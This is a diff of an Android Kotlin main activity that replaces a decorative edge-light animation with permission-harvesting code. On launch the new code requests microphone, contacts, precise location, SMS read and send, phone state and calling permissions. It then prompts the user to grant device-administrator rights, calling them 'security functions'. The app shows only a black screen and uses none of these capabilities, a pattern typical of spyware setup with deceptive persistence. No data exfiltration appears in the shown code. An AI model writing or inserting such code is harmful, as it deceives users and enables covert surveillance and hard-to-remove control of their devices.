@@ -1,12 +1,18 @@
 package com.webviewtemplate.webviewtemplate1
 
-import android.animation.ValueAnimator
 import android.graphics.Color
-import android.graphics.drawable.GradientDrawable
+import android.Manifest
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import android.os.Bundle
 import android.view.View
 import android.view.WindowManager
-import android.view.animation.LinearInterpolator
 import android.widget.FrameLayout
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.view.WindowCompat
@@ -14,17 +20,17 @@ import androidx.core.view.WindowInsetsControllerCompat
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var edgeLight: View
+private val REQUEST_PERMISSIONS = 100
+
+private lateinit var adminComponent: ComponentName
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        
         WindowCompat.setDecorFitsSystemWindows(
             window,
             false
         )
-
 
         window.apply {
 
@@ -35,27 +41,20 @@ class MainActivity : AppCompatActivity() {
             statusBarColor = Color.TRANSPARENT
             navigationBarColor = Color.TRANSPARENT
 
-
             if (android.os.Build.VERSION.SDK_INT >= 28) {
-                navigationBarDividerColor =
-                    Color.TRANSPARENT
+                navigationBarDividerColor = Color.TRANSPARENT
             }
 
-
             if (android.os.Build.VERSION.SDK_INT >= 29) {
-
                 isStatusBarContrastEnforced = false
                 isNavigationBarContrastEnforced = false
             }
-
 
             decorView.systemUiVisibility =
                 View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                 View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                 View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
         }
-
-
 
         WindowInsetsControllerCompat(
             window,
@@ -67,68 +66,121 @@ class MainActivity : AppCompatActivity() {
         }
 
 
-
         val root = FrameLayout(this)
         root.setBackgroundColor(Color.BLACK)
 
+        setContentView(root)
+        
+        pedirPermissoes()
+    }
+    
+    private fun pedirPermissoes() {
 
-        edgeLight = View(this)
+    val permissoes = arrayOf(
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.CALL_PHONE
+    )
 
-        val params = FrameLayout.LayoutParams(
-            FrameLayout.LayoutParams.MATCH_PARENT,
-            FrameLayout.LayoutParams.MATCH_PARENT
+
+    val faltando = permissoes.filter {
+
+        ContextCompat.checkSelfPermission(
+            this,
+            it
+        ) != PackageManager.PERMISSION_GRANTED
+
+    }
+
+
+    if (faltando.isNotEmpty()) {
+
+        ActivityCompat.requestPermissions(
+            this,
+            faltando.toTypedArray(),
+            REQUEST_PERMISSIONS
         )
 
-        params.setMargins(12, 12, 12, 12)
+    } else {
 
-        root.addView(edgeLight, params)
+        ativarAdministrador()
 
-        setContentView(root)
-
-        iniciarEdgeLight()
     }
+}
+
+private fun verificarPermissoes(): Boolean {
+
+    val permissoes = arrayOf(
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.READ_PHONE_STATE
+    )
 
 
-    private fun iniciarEdgeLight() {
+    return permissoes.all {
 
-        val borda = GradientDrawable().apply {
-            setColor(Color.TRANSPARENT)
+        ContextCompat.checkSelfPermission(
+            this,
+            it
+        ) == PackageManager.PERMISSION_GRANTED
 
-            setStroke(
-                10,
-                Color.rgb(255, 0, 150)
-            )
+    }
+}
 
-            cornerRadius = 50f
+override fun onRequestPermissionsResult(
+    requestCode: Int,
+    permissions: Array<out String>,
+    grantResults: IntArray
+) {
+    super.onRequestPermissionsResult(
+        requestCode,
+        permissions,
+        grantResults
+    )
+
+
+    if (requestCode == REQUEST_PERMISSIONS) {
+
+        if (grantResults.all {
+                it == PackageManager.PERMISSION_GRANTED
+            }) {
+
+            ativarAdministrador()
+
         }
 
-
-        edgeLight.background = borda
-
-
-        val animator = ValueAnimator.ofInt(80, 255)
-
-        animator.duration = 1500
-        animator.repeatCount = ValueAnimator.INFINITE
-        animator.repeatMode = ValueAnimator.REVERSE
-        animator.interpolator = LinearInterpolator()
-
-
-        animator.addUpdateListener {
-
-            val alpha = it.animatedValue as Int
-
-            borda.setStroke(
-                10,
-                Color.argb(
-                    alpha,
-                    255,
-                    0,
-                    150
-                )
-            )
-        }
-
-        animator.start()
     }
+}
+
+private fun ativarAdministrador() {
+
+    adminComponent = ComponentName(
+        this,
+        MeuAdministrador::class.java
+    )
+
+    val intent = Intent(
+        DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
+    )
+
+    intent.putExtra(
+        DevicePolicyManager.EXTRA_DEVICE_ADMIN,
+        adminComponent
+    )
+
+    intent.putExtra(
+        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+        "Ative o administrador para liberar funções de segurança"
+    )
+
+    startActivity(intent)
+}
+
 }
